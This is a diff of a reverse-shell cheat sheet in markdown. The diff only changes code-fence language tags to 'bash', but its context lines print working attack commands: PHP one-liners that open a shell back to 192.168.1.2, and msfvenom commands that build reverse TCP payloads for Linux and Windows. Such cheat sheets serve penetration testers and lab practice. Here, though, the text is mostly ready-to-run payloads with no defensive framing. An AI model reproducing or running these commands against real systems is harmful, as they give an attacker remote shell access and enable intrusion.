@@ -1,5 +1,5 @@
 ## PHP Reverse Shell
-```php
+```bash
 php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
  ```
@@ -106,19 +106,19 @@ return 0;
 
  ## Meterpreter Reverse Shell
 ### Linux Non-Staged reverse TCP
-```meterpreter
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
 ```
 ### Linux Staged reverse TCP
-```meterpreter
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
 ```
 ### Windows Non-Staged reverse TCP
-```meterpreter
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
 ### Windows Staged reverse TCP
-```meterpreter
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
  ```
 ---
